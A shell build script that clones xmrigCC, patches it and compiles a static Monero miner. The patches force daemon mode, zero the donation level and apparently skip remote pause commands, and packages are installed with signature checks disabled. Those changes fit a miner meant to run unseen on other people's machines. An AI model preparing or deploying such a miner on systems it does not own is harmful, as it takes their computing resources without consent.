#!/bin/sh
set -e

prevpath=$PWD

## distro pkgs
if type apk; then
    apk --allow-untrusted del -f openssl-dev
    apk --allow-untrusted add -f --update alpine-sdk cmake libuv-dev coreutils libressl-dev libmicrohttpd-dev boost-dev
fi

## get void ; chroot void ...
prevpath=${PWD}
cd ~/
jobs=$(nproc || cat /proc/cpuinfo | grep -i "cpu cores" | wc -l)
[ -z "$jobs" ] && jobs=1

rm -rf xmrigCC
git clone --depth=1 https://github.com/Bendr0id/xmrigCC
# cd xmrigCC; git checkout 1.8.2; cd -
mkdir xmrigCC/build && cd xmrigCC/build || exit 1

## drop shell for xmrigDaemon
# sed -r 's/(=)( ownPath.substr)/\1 "exec " +\2/' -i ../src/cc/XMRigd.cpp
## skip pause patch
patch $PWD/../src/cc/CCClient.cpp ${prevpath}/skipCommand.patch
patch $PWD/../src/Options.cpp ${prevpath}/options.cpp.patch
patch $PWD/../src/Options.h ${prevpath}/options.h.patch
patch $PWD/../src/workers/MultiWorker.cpp ${prevpath}/multiworker.cpp.patch
## skip daemon flag
sed 's/m_daemonized(false)/m_daemonized(true)/' -i ../src/Options.cpp
## donation level
sed -r 's/(kDonateLevel = )([0-9]+)/\10/' -i ../src/donate.h

## build
if [ -z "$(ldd $(which gcc) | grep -i musl)" ]; then
    export CC=${CC:-"$(uname -m)-linux-musl-gcc"}
fi
export MAKEFLAGS=" -j $(nproc) "
export CFLAGS=" -Ofast -Flto"
export CPPFLAGS="$CFLAGS" CXXFLAGS="$CFLAGS" LDFLAGS="$CFLAGS"
## set build flags
sed '/add_executable/iset(CMAKE_EXE_LINKER_FLAGS " -static '"$CFLAGS"'")' -i ../CMakeLists.txt
sed -r '/target_link_libraries\(xmrigMiner xmrig_common/{n;s#(.*?)\)#\1 /usr/lib/libstdc++.a /usr/lib/libc.a )#}' -i ../CMakeLists.txt

cmake .. \
-DWITH_CC_SERVER=OFF -DWITH_HTTPD=OFF \
-DUV_LIBRARY=/usr/lib/libuv.a \
-DOPENSSL_SSL_LIBRARY=/usr/lib/libssl.a \
-DOPENSSL_CRYPTO_LIBRARY=/usr/lib/libcrypto.a

make -j $jobs xmrigMiner
mv xmrigMiner $prevpath/xmrig

## MACOS
# brew install bash gnu-sed gpatch gcc cmake libuv openssl libmicrohttpd boost
# cmake .. -DUV_LIBRARY=/usr/local/lib/libuv.a -DOPENSSL_SSL_LIBRARY=/usr/local/opt/openssl/lib/libssl.a -DOPENSSL_CRYPTO_LIBRARY=/usr/local/opt/openssl/lib/libcrypto.a -DBOOST_ROOT=/usr/local/lib -DWITH_CC_SERVER=ON -DWITH_HTTPD=OFF -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl -DWITH_ASM=OFF
